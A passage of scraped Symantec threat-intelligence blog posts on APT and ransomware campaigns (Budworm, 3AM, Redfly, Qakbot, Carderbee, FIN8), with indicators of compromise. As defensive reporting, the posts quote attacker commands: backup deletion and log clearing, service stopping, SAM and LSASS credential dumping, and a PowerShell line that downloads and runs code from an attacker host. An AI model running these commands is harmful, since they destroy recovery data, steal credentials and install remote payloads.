1f170cfaf3e75ebc7e81860378e353c84469795a162cd3cfd7263ba2a180e67fcaf2254b18eafdc95b83038e9a4385b1a5c2651651d9d288fa0500fede500875266fd18c76959839e8c6b075e4408dcbc0b620f7544f28978b852c1c1ed1b6a06abbab98471d5af33e242acc76d17b41c6e96cce0938a05703b58b91ba8a7af30e02bd45e3570de20777ab7c1eec4797919bfcd39dde681eb69b9faf1b72410e8e6ef0eb3e0f950ec4ced1be0ee6ac0a9349c8280cd8d12cc00850f9dcadcac4c57df4e31dd7094ae96657f54b22c87233e8277a2c40ba56eafcf548d0e1724360e0ae11364d3ac0eb8518ecf5d859128d094e9241d8e6feb43a9f29b19ccfa8bc75ce4cf29eb52d4afe79fe7c3819ac08b68bd87b35225a762112ba6e5d840ddeedc3b691e11a286acd7b6c087a91af27c00044dd1d951da58930683acfe90afa3cbb974e219a5ab8a9ee8c933b397d1c1c97d6e12015726b109f1b5ed10f2564cd60d02666637e9eac36db36f3a13906b851ec1207c7df620d8970 Domaind3ktcnc1w6pd1f.cloudfront[.]net IP addresses172.245.92[.]2073.0.93[.]185 URLshttp://45.148.120[.]23:91/version.dllhttp://45.148.120[.]23:91/vmtools.exe The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/grayling-taiwan-cyber-attacks"
  },
  {
    "title": "budworm tool update telecoms govt",
    "content": "The Budworm advanced persistent threat (APT) group continues to actively develop its toolset. Most recently, the Threat Hunter Team in Symantec, part ofBroadcom, discovered Budworm using an updated version of one of its key tools to target a Middle Eastern telecommunications organization and an Asian government. Both attacks occurred in August 2023. Budworm (aka LuckyMouse, Emissary Panda, APT27) deployed a previously unseen variant of its SysUpdate backdoor (SysUpdate DLL inicore_v2.3.30.dll). SysUpdate is exclusively used by Budworm. As well as its custom malware, Budworm also used a variety of living-off-the-land and publicly available tools in these attacks. It appears the activity by the group may have been stopped early in the attack chain as the only malicious activity seen on infected machines is credential harvesting. Budworm executes SysUpdate on victim networks by DLL sideloading the payload using the legitimate INISafeWebSSO application. This technique has been used by the groupfor some time, with reports of INISafeWebSSO being leveraged dating as far back as 2018. DLL sideloading attacks use the DLL search order mechanism in Windows to plant and then invoke a legitimate application that executes a malicious payload. It can help attackers evade detection. SysUpdate is a feature-rich backdoor that has multiple capabilities, including: Trend Micro reported in March 2023that Budworm had developed a Linux version of SysUpdate with similar capabilities to the Windows version. SysUpdate has been in use by Budworm since at least 2020, and the attackers appear to continually develop the tool to improve its capabilities and avoid detection. As well as SysUpdate, the attackers used a number of legitimate or publicly available tools to map the network and dump credentials. Tools used by the attackers in this campaign included: Budworm is a long-running APT group that is believed to have been active since at least 2013. The attackers are known for their targeting of high-value victims, often focusing on organizations in the government, technology, and defense sectors. Budworm has targeted victims in many countries in Southeast Asia and the Middle East, among other locations, including the U.S.Symantec’s Threat Hunter Team published a blog in October 2022detailing how Budworm activity was seen on the network of a U.S. state legislature. In that campaign, the attackers also targeted the government of a Middle Eastern country, a multinational electronics manufacturer, and a hospital in Southeast Asia. The attackers also leveraged DLL sideloading in that campaign to load their HyperBro malware. The victims in this campaign — a government in Asia and a telecommunications company in the Middle East — do align with the kinds of victims we often see Budworm targeting. The targeting of a telecommunications company and government also point to the motivation behind the campaign being intelligence gathering, which is the motivation that generally drives Budworm activity. That Budworm continues to use a known malware (SysUpdate), alongside techniques it is known to favor, such as DLL sideloading using an application it has used for this purpose before, indicate that the group isn’t too concerned about having this activity associated with it if it is discovered. The use of a previously unseen version of the SysUpdate tool also demonstrates that the group is continuing to actively develop its toolset. The fact that this activity occurred as recently as August 2023 suggests that the group is currently active, and that those organizations that may be of interest to Budworm should be aware of this activity and the group’s current toolset. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. c501203ff3335fbfc258b2729a72e82638719f60f7e6361fc1ca3c8560365a0e — Legitimate INISafeWebSSO application c4f7ec0c03bcacaaa8864b715eb617d5a86b5b3ca6ee1e69ac766773c4eb00e6 — SysUpdate backdoor 551397b680da0573a85423fbb0bd10dac017f061a73f2b8ebc11084c1b364466 — Password dumper df571c233c3c10462f4d88469bababe4c57c21a52cca80f2b1e1af848a2b4d23 — Hacktool c3405d9c9d593d75d773c0615254e69d0362954384058ee970a3ec0944519c37 — SecretsDump f157090fd3ccd4220298c06ce8734361b724d80459592b10ac632acc624f455e — AdFind ee9dfcea61282b4c662085418c7ad63a0cbbeb3a057b6c9f794bb32455c3a79e — Curl The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/budworm-tool-update-telecoms-govt"
  },
  {
    "title": "3am ransomware lockbit",
    "content": "A new ransomware family calling itself 3AM has emerged. To date, the ransomware has only been used in a limited fashion. Symantec’s Threat Hunter Team, part of Broadcom, has seen it used in a single attack by a ransomware affiliate that attempted to deploy LockBit on a target’s network and then switched to 3AM when LockBit was blocked. 3AM is written in Rust and appears to be a completely new malware family. The ransomware attempts to stop multiple services on the infected computer before it begins encrypting files. Once encryption is complete, it attempts to delete Volume Shadow (VSS) copies. It is still unclear whether its authors have any links to known cybercrime organizations. The first suspicious activity from the threat actor involved the use of the gpresult command to dump the policy settings enforced on the computer for a specified user. The attacker also executed various Cobalt Strike components and tried to escalate privileges on the computer using PsExec. The attackers then ran reconnaissance commands such as whoami, netstat, quser, and net share, and tried to enumerate other servers for lateral movement with the quser and net view commands. They also added a new user for persistence and used the Wput tool to exfiltrate the victims’ files to their own FTP server. The attackers first attempted to use the LockBit ransomware but when that was blocked, they resorted to 3AM instead. The use of 3AM was only partially successful. The attackers only managed to deploy it to three machines on the organization's network and it was blocked on two of those three computers. 3AM is so-called because it appends encrypted files with the extension .threeamtime. The ransom note also makes reference to 3AM: Hello. \"3 am\" The time of mysticism, isn't it? All your files are mysteriously encrypted, and the systems \"show no signs of life\", the backups disappeared. But we can correct this very quickly and return all your files and operation of the systems to original state. All your attempts to restore data by himself will definitely lead to their damage and the impossibility of recovery. We are not recommended to you to do it on our own!!! (or do at your own peril and risk). There is another important point: we stole a fairly large amount of sensitive data from your local network: financial documents; personal information of your employees, customers, partners; work documentation, postal correspondence and much more. We prefer to keep it secret, we have no goal to destroy your business. Therefore can be no leakage on our part. We propose to reach an agreement and conclude a deal. Otherwise, your data will be sold to DarkNet/DarkWeb. One can only guess how they will be used. Please contact us as soon as possible, using Tor-browser: http://threeam7[REDACTED].onion/recovery [32 CHARS SPECIFIED BY -k COMMAND LINE PARAMETER] The ransomware is a 64-bit executable written in Rust and it recognises the following command-line parameters: The command-line parameters \"-m\" and \"-h\" are mutually exclusive. The usage of the “-h” and “-m” parameters and its values “local” and “net” are very similar to arguments used by Conti. When the malware is executed, it attempts to run the following commands, most of which attempt to stop various security and backup related software: \"netsh.exe\" advfirewall firewall set rule \"group=”Network Discovery”\" new enable=Yes \"wbadmin.exe\" delete systemstatebackup -keepVersions:0 -quiet \"wbadmin.exe\" DELETE SYSTEMSTATEBACKUP \"wbadmin.exe\" DELETE SYSTEMSTATEBACKUP -deleteOldest \"bcdedit.exe\" /set {default} recoveryenabled No \"bcdedit.exe\" /set {default} bootstatuspolicy ignoreallfailures \"wmic.exe\" SHADOWCOPY DELETE /nointeractive \"cmd.exe\" /c wevtutil cl security \"cmd.exe\" /c wevtutil cl system \"cmd.exe\" /c wevtutil cl application \"net\" stop /y xchange \"net\" stop /y acronis \"net\" stop /y AcronisAgent \"net\" stop /y AcrSch2Svc \"net\" stop /y Enterprise \"net\" stop /y VeeamTransportSvc \"net\" stop /y VeeamNFSSvc \"net\" stop /y DCAgent \"net\" stop /y EPSecurity \"net\" stop /y EPUpdate \"net\" stop /y EsgShKernel \"net\" stop /y FA_Scheduler \"net\" stop /y IISAdmin \"net\" stop /y Endpoint \"net\" stop /y McShield \"net\" stop /y Exchange \"net\" stop /y Monitor \"net\" stop /y Smcinst \"net\" stop /y SmcService \"net\" stop /y ccEvtMgr \"net\" stop /y ccSetMgr \"net\" stop /y TrueKey \"net\" stop /y tmlisten \"net\" stop /y UIODetect \"net\" stop /y NetMsmq \"net\" stop /y EhttpSrv \"net\" stop /y ESHASRV \"net\" stop /y klnagent \"net\" stop /y wbengine \"net\" stop /y mfefire \"net\" stop /y GxCIMgr \"net\" stop /y BackupExecVSSProvider \"net\" stop /y BackupExecManagementService \"net\" stop /y BackupExecJobEngine \"net\" stop /y BackupExecDiveciMediaService \"net\" stop /y BackupExecAgentBrowser \"net\" stop /y BackupExecAgentAccelerator \"net\" stop /y BacupExecRPCService \"net\" stop /y CASAD2WebSvc \"net\" stop /y CAARCUpdateSvc \"net\" stop /y YooBackup The ransomware will then scan the disk and any files matching predefined criteria are encrypted and the original files are deleted. The malware will then create the file \"RECOVER-FILES.txt\" in each scanned folder. This file contains the ransom note. The encrypted files contain a marker string \"0x666\" followed by the data appended by the ransomware. After encryption, the malware attempts to run the following command to delete volume shadow backup copies: vssadmin.exe delete shadows /all /quiet Ransomware affiliates have become increasingly independent from ransomware operators and this isnot the first time Symantec has seen an attacker attempt to deploy two different kinds of ransomwarein a single attack. New ransomware families appear frequently and most disappear just as quickly or never manage to gain significant traction. However, the fact that 3AM was used as a fallback by a LockBit affiliate suggests that it may be of interest to attackers and could be seen again in the future. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 079b99f6601f0f6258f4220438de4e175eb4853649c2d34ada72cce6b1702e22 – LockBit 307a1217aac33c4b7a9cd923162439c19483e952c2ceb15aa82a98b46ff8942e – 3AM 680677e14e50f526cced739890ed02fc01da275f9db59482d96b96fbc092d2f4 – Cobalt Strike 991ee9548b55e5c815cc877af970542312cff79b3ba01a04a469b645c5d880af – Cobalt Strike ecbdb9cb442a2c712c6fb8aee0ae68758bc79fa064251bab53b62f9e7156febc – Cobalt Strike The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/3am-ransomware-lockbit"
  },
  {
    "title": "critical infrastructure attacks",
    "content": "Espionage actors are continuing to mount attacks on critical national infrastructure (CNI) targets, a trend that has become a source of concern for governments and CNI organizations worldwide. Symantec’s Threat Hunter Team has found evidence that a threat actor group Symantec calls Redfly used the ShadowPad Trojan to compromise a national grid in an Asian country for as long as six months earlier this year. The attackers managed to steal credentials and compromise multiple computers on the organization’s network. The attack is the latest in a series of espionage intrusions against CNI targets. In May 2023, the U.S., UK, Australian, Canadian, and New Zealand governmentsissued a joint alertabout threat actors targeting CNI organizations in the U.S. using techniques that could potentially be replicated against targets in other countries. The alert followedMicrosoft’s report on Volt Typhoon, an espionage actor that compromised several critical infrastructure organizations in the U.S. ShadowPad is a modular remote access Trojan (RAT) that was designed as a successor to the Korplug/PlugX Trojan, and was, for a period of time, sold in underground forums. However, despite its origins as a publicly available tool, it was only sold publicly for a very short time reportedly to a handful of buyers. It has since beenclosely linked to espionage actors. While ShadowPad is known to be used by multiple advanced persistent threat (APT) actors, identified tools and infrastructure used in the recent campaign targeting a national power grid overlaps with previously reported attacks attributed to a cluster of APT41 activity (aka Brass Typhoon, Wicked Panda, Winnti, and Red Echo). Symantec tracks this group under as multiple distinct actors such as Blackfly and Grayfly, where links between these groups have beendiscussed before. The activities identified in this campaign are currently being tracked under a separate group that Symantec has dubbed Redfly, which appears to exclusively focus on targeting CNI. A distinct variant of the ShadowPad Trojan was used in this attack. It utilized the domain websencl[.]com for command-and-control (C&C) purposes. It copied itself to disk in the following locations, masquerading as VMware files and directories to mask its purpose (there is no other evident association with VMware products): Persistence is achieved by creating the following service that is configured to start with Windows on boot-up: ServiceName: VMware Snapshot Provider Service DisplayName: VMware Snapshot Provider Service ServiceType: SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS StartType: SERVICE_AUTO_START BinaryPathName: C:\\ProgramData\\VMware\\RawdskCompatibility\\virtual\\vmrawdsk.exe This is a tool used to load and execute shellcode. The shellcode is stored in a file in an encrypted form. It allows the attackers to deliver and execute arbitrary files or commands on an infected computer. The tool is a 64-bit dynamic link library (DLL) that has one export, called WorkProc, which accepts an additional command-line argument. This argument is interpreted as a string and can be used as a decryption key. If no key is passed on the command line, the malware attempts to retrieve a key from the following registry location instead: In all cases, the malware checks that the string length of the decryption secret is 0x20 characters. The malware then loads its payload. It will first check if the following file exists: If the file exists, its contents are used as the encrypted payload. Otherwise, the malware attempts to retrieve a payload from the registry at the following location: The malware will then decrypt the loaded payload with the Advanced Encryption Standard (AES) algorithm in Electronic Code Book (ECB) mode using the first 0x10 bytes of the decryption key as the AES key. Finally, it creates a new thread to execute the decrypted payload as shellcode. The attackers also employed a keylogger, which was installed under various file names on different computers, including winlogon.exe and hphelper.exe. The keylogger was configured to store captured keystrokes in the following location: The first evidence of intrusion on the targeted network dated from February 28, 2023, when ShadowPad was executed on a single computer. It was executed again on May 17 2023, suggesting that the attackers had maintained a presence in the intervening three months. A day earlier (May 16), a suspicious Windows batch file (file name: 1.bat) was executed. Shortly afterwards, PackerLoader was executed via rundll32 from the %TEMP% directory with some command-line arguments: rundll32 %TEMP\\%packerloader.dll WorkProc E10ADC3949BA59ABBE56E057F20F883E Immediately afterwards, permissions were modified for a driver file called dump_diskfs.sys to grant access to all users. It is possible the attackers used this driver to create dumps of the file system for later exfiltration. Four minutes later, credentials were dumped from the Windows registry: reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.sav reg save HKLM\\SECURITY security.save On May 19, the attackers returned, running PackerLoader and the 1.bat batch file again. Shortly afterwards, a legitimate binary named displayswitch.exe was executed. It was likely being used to perform DLL side-loading. This involves the attackers placing a malicious DLL in a directory where a legitimate DLL is expected to be found. The attacker then runs the legitimate application (having installed it themselves). The legitimate application then loads and executes the payload. Several hours later a suspicious PowerShell command was executed and used to gather information on the storage devices attached to the system. Specifically it was designed to look for DriveType=3 (Read/Write Supported) and gather details on available space. powershell -executionpolicy ByPass -command \"$disks = Get-WmiObject Win32_LogicalDisk -Filter \\\" DriveType = 3\\\" ; foreach ($disk in $disks) { $freeSpace = \\\"{0:N2}\\\" -f ($disk.FreeSpace/1GB) ; Write-Host \\\"Drive Free Space: $($disk.DeviceID) $freeSpace\\\"; }\" Several hours later, a similar set of activity occurred again. On May 26, displayswitch.exe was executed from the %TEMP% directory via the command prompt. Less than an hour later, several commands were executed via displayswitch.exe to dump credentials from the registry and clear the Windows security event logs: reg save HKLM\\SAM sam.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SECURITY security.save reg save HKLM\\SAM sam.save reg save HKLM\\SECURITY security.save On May 29, the attackers returned and used a renamed version of ProcDump (file name: alg.exe) to dump credentials from LSASS. alg.exe -accepteula -ma lsass.exe z1.dmp On May 31, a scheduled task is used to execute oleview.exe, mostly likely to perform side-loading and laterally movement. Use of Oleview by ShadowPad has beenpreviously documented by Dell Secureworksand was also reported to have been used in attacks against industrial control systems. The command specified that Oleview was to be executed on a remote machine using the task name (TendView) at 07:30 a.m. It appears the attackers likely used stolen credentials in order to spread their malware onto other machines within the network. schtasks /create /s \\\\[REMOVED] /u [REMOVED] /P [REMOVED] /tr \"CSIDL_PROFILE\\[REMOVED]\\appdata\\local\\temp\\oleview.exe\" /tn TrendView /st 07:30 /sc once /ru \" \" /f Malicious activity appeared to cease until July 27, when a keylogger (file name: winlogon.exe) was installed on a machine. The final evidence of malicious activity came on August 3, when the attackers returned and attempted to dump credentials again using a renamed version of ProcDump (file name: yara32.exe): yara32.exe -accepteula -ma lsass.exe z1.dmp Minutes later, the attackers also attempted to dump credentials from the Windows registry: reg save HKLM\\SAM sam.save reg save HKLM\\SAM sam.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SECURITY security.save reg save HKLM\\SECURITY security.save Attacks against CNI targets are not unprecedented. Almost a decade ago,Symantec uncovered the Russian-sponsored Dragonfly group’s attacksagainst the energy sectors in the U.S. and Europe. More recently, the Russian Sandworm group mounted attacks against the electricity distribution network in Ukraine, which were directed at disrupting electricity supplies. However, the frequency at which CNI organizations are being attacked appears to have increased over the past year and is now a source of concern. Threat actors maintaining a long-term, persistent presence on a national grid presents a clear risk of attacks designed to disrupt power supplies and other vital services in nation-states during times of increased political tension. While Symantec has not seen any disruptive activity by Redfly, the fact that such attacks have occurred in other regions means they are not outside the bounds of possibility. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/critical-infrastructure-attacks"
  },
  {
    "title": "qakbot takedown disruption",
    "content": "A major international law enforcement operation has disrupted the notorious Qakbot botnet and taken much of its infrastructure offline.Led by the U.S. Federal Bureau of Investigation (FBI) and Justice Departmentand involving agencies from France, Germany, the Netherlands, the UK, Romania, and Latvia, the operation has resulted in the deletion of the Qakbot malware from more than 700,000 victim’s computers and the seizure of $8.6 million in cryptocurrency that is suspected to be the profit of cybercrime. The takedown operation saw the FBI obtaining access to Qakbot infrastructure, which allowed it to identify more than 700,000 infections and redirect the botnet’s traffic to servers controlled by the agency. An uninstaller was then distributed that removed the infected computers from the botnet. Qakbot is operated by a cybercrime group Symantec, part of Broadcom, calls Batbug. The malware is one of the most enduring threats, having first appeared in 2007. Like several similar malware families, Qakbot started life as a banking Trojan and, aside from its prevalence, it became known for its functionality and adaptability. For example, once it infected one machine in an organization, it was able to spread laterally across networks utilizing a worm-like functionality through brute-forcing network shares and Active Directory user group accounts, or via server message block (SMB) exploitation. Qakbot is largely spread via email. While it was once delivered by the Emotet botnet, Qakbot is now usually delivered directly via email spam runs, suggesting its operators acquired access to spamming infrastructure following Emotet’s disappearance. These emails may include a malicious link or attachment, and the subject lines generally refer to popular lure subjects such as shipping updates, work orders, urgent requests, invoices, and claims. In recent years, Qakbot has become closely associated with ransomware activity with Qakbot infections acting as the initial breach that ultimately leads to ransomware deployment on an organization’s network. Qakbot has been associated with multiple ransomware operations in recent years, including Sodinokibi, Egregor, ProLock, and MountLocker. Most recently, it has been seen collaborating with the BlackBasta ransomware operation. Activity by Qakbot stepped up significantly from January 2023, when its malicious emails leveraged Microsoft OneNote attachments to drop Qakbot on infected machines. OneNote is a desktop digital notebook application that is installed by default in all Microsoft Office/365 installations. Even if a Windows user does not typically use the application, it is still available to open the file format. The malicious emails contained an embedded URL. When clicked, it leads to a ZIP archive that contains a malicious OneNote file. Clicking on this file leads to the execution of an HTML Application (HTA) file that ultimately leads to a Qakbot DLL being downloaded onto a victim’s machine. It is downloaded as a .png file via curl before being loaded by rundll32.exe. There were indications in at least one Qakbot attack observed by Symantec that the initial access vector may have been malvertising. The attack chain in that instance began with the victim visiting a malicious website on the Chrome browser. This coincided with reports about malware, including IcedID, being spread via ads on Google. This surge in Qakbot activity appeared to last until June 2023. The attackers made frequent tweaks to their attack chain, likely in a bid to evade detection. OneNote files were eventually abandoned and by June the attackers were largely favoring PDF documents, which led to URLs from which malicious ZIP archives containing JavaScript downloaders were downloaded. It is unclear yet whether Qakbot's sudden cessation of activity in June was linked to this takedown operation. Batbug has long been one of the largest players in the cybercrime landscape, controlling a lucrative malware distribution network that was linked to multiple major ransomware gangs. This takedown is likely to disrupt Batbug’s operations and it is possible that the group may struggle to rebuild its infrastructure in its aftermath. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/qakbot-takedown-disruption"
  },
  {
    "title": "carderbee software supply chain certificate abuse",
    "content": "12.20pm BST, 22 August 2023: Updated with additional IoCs A previously unknown advanced persistent threat (APT) group used the legitimate Cobra DocGuard software to carry out a supply chain attack with the goal of deploying the Korplug backdoor (aka PlugX) onto victim computers. In the course of this attack, the attackers used malware signed with a legitimate Microsoft certificate. Most of the victims in this campaign are based in Hong Kong, with some victims based in other regions of Asia. Korplug is known to be used by multiple APT groups, but we could not link this activity to a known threat actor so we have given the actor behind this activity a new name — Carderbee. Cobra DocGuard Client is software produced by a China-based company called EsafeNet and appears to legitimately be used to protect, encrypt, and decrypt software. EsafeNet is owned by Chinese information security firm NSFOCUS. According to a report from ESET, in September 2022, a malicious update to this software was used to compromise a gambling company in Hong Kong. The same gambling company had been compromised in September 2021 using the same technique by Budworm (aka LuckyMouse, APT27), which led ESET to attribute this September 2022 attack to Budworm too. In that attack, a new variant of the Korplug malware was also found. In that instance, it used the magic header “ESET”, indicating that it may have been modified to try to bypass ESET products. A signed version of Korplug was also used in the activity investigated by the Symantec Threat Hunter Team, part of Broadcom. This activity began in April 2023. However, we did not find any other evidence to indicate that this attack was carried out by Budworm. Korplug is a backdoor that is known to be used by multiple APTs, including APT41 and Budworm. We do not have any indication of the industry sectors of the companies targeted in this recent activity, just their geographic location. Accordingly, it was not possible to link this activity definitively to a known group, which is why we attributed it to a new group, Carderbee. Malicious activity was seen on about 100 computers in impacted organizations; however, the Cobra DocGuard software was installed on around 2,000 computers, indicating that the attacker may be selectively pushing payloads to specific victims. The malicious software was delivered to the following location on infected computers, which is what indicates that a supply chain attack or malicious configuration involving Cobra DocGuard is how the attackers compromised affected computers: \"csidl_system_drive\\program files\\esafenet\\cobra docguard client\\update\" Over a period of a few months in 2023, multiple distinct malware families were observed being deployed via this method. In one interesting case, a downloader deployed by the attackers had a digitally signed certificate from Microsoft, called Microsoft Windows Hardware Compatibility Publisher. This downloader was used to install the Korplug backdoor on targeted systems. The downloader attempted to download a file named update.zip from the following location:http://cdn.stream-amazon[.]com/update.zip. The update.zip file is a zlib compressed archive file. It decompresses and executes a file named content.dll. This file is not saved on disk. It acts as a dropper and contains x64 and x86 drivers, which are dropped depending on the system environment. The dropper creates services and registry entries. The dropped drivers read encrypted data from the registry, decrypt it, and inject it into svchost.exe. The injected payload is the Korplug backdoor. The Korplug sample downloaded here is able to: Use of Microsoft-signed malwareis a known problem. In December 2022,Mandiant noteda POORTRY driver sample signed with a Microsoft Windows Hardware Compatibility Authenticode signature. Most recently, in July 2023,Trend saidthat it had found a Microsoft-signed rootkit that appeared to have passed through the Windows Hardware Quality Labs (WHQL) process for getting a valid signature. Microsoftacknowledged the issueand said that drivers certified by Microsoft’s Windows Hardware Developer Program (MWHDP) were being used maliciously in post-exploitation activity. The company said it had investigated the issue and “determined that the activity was limited to the abuse of several developer program accounts and that no Microsoft account compromise has been identified.” Malware signed with what appears to be a legitimate certificate can make it much harder for security software to detect. It seems clear that the attackers behind this activity are patient and skilled actors. They leverage both a supply chain attack and signed malware to carry out their activity in an attempt to stay under the radar. The fact that they appear to only deploy their payload on a handful of the computers they gain access to also points to a certain amount of planning and reconnaissance on behalf of the attackers behind this activity. Software supply chain attacks remain a major issue for organizations in all sectors, with multiple high-profile supply chain attacks occurring in the last 12 months, including theMOVEit,X_Trader, and3CX attacks. Some unanswered questions remain about the activity of Carderbee, such as what sectors the group was targeting with this activity, and whether there are any links between Carderbee and other actors such as Budworm. Symantec researchers will continue to track this activity, and we share indicators of compromise below so our colleagues in the security community can do so as well. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 96170614bbd02223dc79cec12afb6b11004c8edb8f3de91f78a6fc54d0844622 19a6a404605be964ab87905d59402e2890460709a1d9038c66b3fbeedc1a2343 1ff7b55dde007b7909f43dd47692f7c171caa2897d663eb9db01001062b1fe9d 2400d8e66c652f4f8a13c99a5ffb67cb5c0510144b30e93122b1809b58614936 2f714aaf9e3e3e03e8168fe5e22ba6d8c1b04cbfa3d37ff389e9f1568a80cad4 47b660bbaacb2a602640b5e2c589a3adc620a0bfc9f0ecfb8d813a803d7b75e2 5467e163621698b38c2ba82372bac110cea4121d7c1cec096958a4d9eaa44be7 7e6d0f14302662f52e4379eb5b69a3749d8597e8f61266aeda74611258972a3d 85fc7628c5c7190f25da7a2c7ee16fc2ad581e1b0b07ba4ac33cff4c6e94c8af 8bd40da84c8fa5f6f8e058ae7e36e1023aca1b9a9c8379704934a077080da76f 8ca135b2f4df6a714b56c1a47ac5baa80a11c6a4fcc1d84a047d77da1628f53f 9e96f70ce312f2638a99cfbd3820e85798c0103c7dc06fe0182523e3bf1e2805 9fc49d9f4b922112c2bafe3f1181de6540d94f901b823e11c008f6d1b2de218c b5159f8ae16deda7aa5d55100a0eac6e5dacd1f6502689b543513a742353d1ea b7b8ea25786f8e82aabe4a4385c6142d9afe03f090d1433d0dc6d4d6ccc27510 b84f68ab098ce43f9cb363d0a20a2267e7130078d3d2d8408bfb32bbca95ca37 f64267decaa982c63185d92e028f52c31c036e85b2731a6e0bccdb8f7b646e97 http://111.231.100[.]228:8888/CDGServer3/UpgradeService2 http://103.151.28[.]11:8090/CDGServer3/UpgradeService2 cdn.stream-amazon[.]com tjj.active-microsoft[.]com githubassets.akamaixed[.]net ms-g9-sites-prod-cdn.akamaixed[.]net ms-f7-sites-prod-cdn.akamaixed[.]net The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/carderbee-software-supply-chain-certificate-abuse"
  },
  {
    "title": "syssphinx fin8 backdoor",
    "content": "Symantec’s Threat Hunter Team, a part ofBroadcom, recently observed the Syssphinx (aka FIN8) cyber-crime group deploying a variant of the Sardonic backdoor to deliver the Noberus ransomware. While analysis of the backdoor revealed it to be part of the Sardonic framework previously used by the group, and analyzed in a2021 report from Bitdefender, it seems that most of the backdoor’s features have been altered to give it a new appearance. Active since at least January 2016, Syssphinx (aka FIN8) is a financially motivated cyber-crime group known for targeting organizations in the hospitality, retail, entertainment, insurance, technology, chemicals, and finance sectors. The group is known for utilizing so-called living-off-the-land tactics, making use of built-in tools and interfaces such as PowerShell and WMI, and abusing legitimate services to disguise its activity. Social engineering and spear-phishing are two of the group’s preferred methods for initial compromise. While Syssphinx initially specialized in point-of-sale (POS) attacks, in the past few years the group has been observed using a number of ransomware threats in its attacks. In June 2021, Syssphinx was seen deploying the Ragnar Locker ransomware onto machines it had compromised in a financial services company in the U.S. earlier in the year. The activity marked the first time the group was observed using ransomware in its attacks. Ragnar Locker is developed by a financially motivated cyber-crime group Symantec calls Hornworm (aka Viking Spider). In January 2022, a family of ransomware known as White Rabbit was linked to Syssphinx. A malicious URL linked to White Rabbit attacks was alsolinked to Syssphinx. In addition, attacks involving White Rabbit used a variant of the Sardonic backdoor, a known Syssphinx tool. In December 2022, Symantec observed the group attempting to deploy theNoberus(aka ALPHV, BlackCat) ransomware in attacks. Noberus is operated by a financially motivated cyber-crime group Symantec calls Coreid (aka Blackmatter, Carbon Spider, FIN7). The Syssphinx group’s move to ransomware suggests the threat actors may be diversifying their focus in an effort to maximize profits from compromised organizations. Syssphinx is known for taking extended breaks between attack campaigns in order to improve its tactics, techniques, and procedures (TTPs). For instance, since 2019, Syssphinx had used backdoor malware called Badhatch in attacks. Syssphinx updated Badhatch in December 2020 and then again in January 2021. Then in August 2021, Bitdefender researcherspublished detailsof a new backdoor dubbed Sardonic and linked it to the same group. The C++-based Sardonic backdoor has the ability to harvest system information and execute commands, and has a plugin system designed to load and execute additional malware payloads delivered as DLLs. The Syssphinx attack observed by Symantec in December 2022, in which the attackers attempted to deploy the Noberus ransomware, involved similar techniques as a Syssphinx attackdescribed by Bitdefender researchers in 2021. However, the most recent attack had some key differences, including the final payload being the Noberus ransomware and the use of a reworked backdoor. The revamped Sardonic backdoor analyzed in this blog shares a number of features with the C++-based Sardonic backdoor analyzed by Bitdefender. However, most of the backdoor’s code has been rewritten, such that it gains a new appearance. Interestingly, the backdoor code no longer uses the C++ standard library and most of the object-oriented features have been replaced with a plain C implementation. In addition, some of the reworkings look unnatural, suggesting that the primary goal of the threat actors could be to avoid similarities with previously disclosed details. For example, when sending messages over the network, the operation code specifying how to interpret the message has been moved after the variable part of the message, a change that adds some complications to the backdoor logic. This goal seemed limited to just the backdoor itself, as known Syssphinx techniques were still used. During the December 2022 incident, the attackers connected with PsExec to execute the command “quser” in order to display the session details and then the following command to launch the backdoor: powershell.exe -nop -ep bypass -c iex (New-Object System.Net.WebClient).DownloadString('https://37-10-71-215[.]nip[.]io:8443/7ea5fa') Next, the attackers connected to the backdoor to check details of the affected computer before executing the command to establish persistence. powershell -nop -ep bypass -c CSIDL_WINDOWS\\temp\\1.ps1 2BDf39983402C1E50e1d4b85766AcF7a This resulted with a process similar to that described by Bitdefender. powershell.exe -nop -c [System.Reflection.Assembly]::Load(([WmiClass] 'root\\cimv2:System__Cls').Properties['Parameter'].Value);[a8E95540.b2ADc60F955]::c3B3FE9127a() The next day, the attackers connected to the persistent backdoor, but paused after running a few basic commands. Roughly 30 minutes later, the activity resumed with the attackers using what looked like wmiexec.py from Impacket, which started a process to launch a new backdoor. 